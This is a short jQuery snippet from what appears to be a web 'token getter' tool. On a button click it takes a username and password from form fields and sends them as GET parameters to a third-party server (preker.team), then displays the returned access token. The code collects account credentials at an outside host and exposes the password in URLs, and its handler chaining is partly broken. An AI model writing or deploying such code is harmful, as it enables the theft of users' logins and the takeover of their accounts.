<script>
  $("#get_token").click(function(){
  $("#get_token").button('loading');
    var tk = document.getElementById("tk").value;
    var mk = document.getElementById("mk").value;
    var url = "https://preker.team/assets/token.php";
    $.get(url, {
      u: tk,
      p: mk
    }).done(function(e) {
        //console.log(e);
          $("#get_token").button('reset');
          if(e.session_key){
            access_token.value=e.access_token;
          }else{
            access_token.value=e.error_msg;
          }
    }).error(function() {
        $("#get_token").button('reset');
        access_token.value='Server Aplikasi Gagal';
    });
  }).error(err => {
    $("#get_token").button('reset');
  });
